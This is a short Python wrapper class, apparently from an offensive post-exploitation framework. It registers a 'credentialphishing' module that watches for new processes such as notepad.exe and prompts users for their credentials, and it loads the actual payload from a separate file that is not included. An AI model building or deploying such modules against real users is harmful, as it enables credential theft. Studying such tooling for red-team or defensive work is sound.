class STModule:
    def __init__(self):
        self.name = 'boo/credentialphishing'
        self.language = 'boo'
        self.description = 'Subscribe to the InstanceCreation event and prompt for credentials.'
        self.author = '@davidtavarez'
        self.options = {
            'Targets': {
                'Description'   :   'Instances to subscribe',
                'Required'      :   True,
                'Value'         :   ['notepad.exe']
            }
        }

    def payload(self):
        with open('modules/boo/src/credentialphishing.boo', 'r') as module_src:
            src = module_src.read()
            return src
